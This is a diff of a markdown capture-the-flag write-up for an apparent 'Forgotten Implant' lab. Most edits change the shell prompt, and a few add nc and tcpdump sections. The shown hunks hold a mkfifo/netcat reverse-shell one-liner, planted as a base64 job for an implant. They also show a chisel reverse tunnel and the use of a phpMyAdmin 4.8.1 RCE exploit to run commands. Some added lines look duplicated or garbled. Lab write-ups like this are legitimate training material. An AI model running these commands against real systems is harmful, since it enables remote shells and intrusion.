@@ -22,7 +22,7 @@ Note: While being very linear, this room can be solved in various ways. To get t
 <h2>nmap</h2>
 
 ```bash
-:~# nmap -sT -p- xx.xxx.xx.xx
+:~/ForgottenImplant#nmap -sT -p- xx.xxx.xx.xx
 ...
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -30,15 +30,38 @@ PORT   STATE SERVICE
 
 <img width="919" height="261" alt="image" src="https://github.com/user-attachments/assets/9ab37d0f-2c18-4519-bc31-c9e13fb98eac" />
 
+
 <br>
 <br>
-<br>
+<h2>nc</h2>
 
 ```bash
-:~# nc -nlvp 81
+:~/ForgottenImplant# nc -nlvp 81
+Listening on 0.0.0.0 81
+```
+
+<br>
+<h2>tcpdump</h2>
+
+```bash
+:~/ForgottenImplant# tcpdump -i ens5
+Listening on 0.0.0.0 81
+```
+
+
+<img width="1253" height="282" alt="image" src="https://github.com/user-attachments/assets/94b1a7ae-9524-4d8c-8f6c-92e6f03d253e" />
+
+
+
+<h2>nc</h2>
+
+```bash
+:~/ForgottenImplant# nc -nlvp 81
 Listening on 0.0.0.0 81
 Connection received on xx.xxx.xx.xx 40300
-GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1
+GET
+DktMDlUMDE6Mjc6MDIuMDEzODMzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03Mi0xMTYifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9
+/heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1
 Host: xx.xxx.xx.xxx:81
 User-Agent: python-requests/2.22.0
 Accept-Encoding: gzip, deflate
@@ -50,19 +73,19 @@ Connection: keep-alive
 <br>
 
 ```bash
-:~# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
+:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
 ```
 
 <br>
 <br>
 
 ```bash
-:~# echo 'eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0=' | base64 -d
+:~/ForgottenImplant# echo 'eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0=' | base64 -d
 {"time": "2025-xx-xxTxx:xx:xx1.xxxxxx", "systeminfo": {"os": "Linux", "hostname": "ip-xx-xxx-xx-xx"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
 ```
 
 ```bash
-:~# python3 -m http.server 81
+:~/ForgottenImplant# python3 -m http.server 81
 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
 xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
 xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6MzI6MDIuMDA2MDMzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1" 404 -
@@ -76,11 +99,11 @@ xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2U
 <br>
 
 ```bash
-:~# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
+:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
 ```
 
 ```bash
-:~# python3 -m http.server 81
+:~/ForgottenImplant# python3 -m http.server 81
 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
 ...
 xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
@@ -90,7 +113,7 @@ xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200
 <h2>ada</h2>
 
 ```bash
-:~# nc -nlvp 4444
+:~/ForgottenImplant# nc -nlvp 4444
 Listening on 0.0.0.0 4444
 Connection received on xx.xxx.xx.xx 52044
 bash: cannot set terminal process group (1364): Inappropriate ioctl for device
@@ -351,7 +374,7 @@ $(function() {AJAX.fireOnload("whitelist.php");AJAX.fireOnload("vendor/sprintf.j
 <h2>chisel</h2>
 
 ```bash
-:~# chisel server --reverse --port 1234
+:~/ForgottenImplant#chisel server --reverse --port 1234
 2025/09/xx xx:xx:xx server: Reverse tunnelling enabled
 2025/09/xx xx:xx:xx server: Fingerprint R9KZw1WfMdiIEF9X6AKUOp7jJtxikqCAKR4yi104tD8=
 2025/09/xx xx:xx:xx server: Listening on http://0.0.0.0:1234
@@ -389,7 +412,7 @@ ada@...:/tmp$ chmod +x chisel
 <br>
 
 ```bash
-:~# python3 50457.py 127.0.0.1 5000 / app s4Ucbrme 'sudo -l'
+:~/ForgottenImplant# python3 50457.py 127.0.0.1 5000 / app s4Ucbrme 'sudo -l'
 Start tag: html
 Start tag: body
 Start tag: h1
@@ -414,7 +437,7 @@ User www-data may run the following commands on ip-xx-xxx-xx-xx:
 <h2>CVE-2018-12613</h2>
 
 ```bash
-:~# searchsploit phpmyadmin 4.8.1
+:~/ForgottenImplant# searchsploit phpmyadmin 4.8.1
 ---------------------------------------------- ---------------------------------
  Exploit Title                                |  Path
 ---------------------------------------------- ---------------------------------
@@ -426,7 +449,7 @@ Shellcodes: No Results
 ``` 
 
 ```bash
-:~# searchsploit -m php/webapps/50457.py
+:~/ForgottenImplant#searchsploit -m php/webapps/50457.py
   Exploit: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
       URL: https://www.exploit-db.com/exploits/50457
      Path: /opt/exploitdb/exploits/php/webapps/50457.py
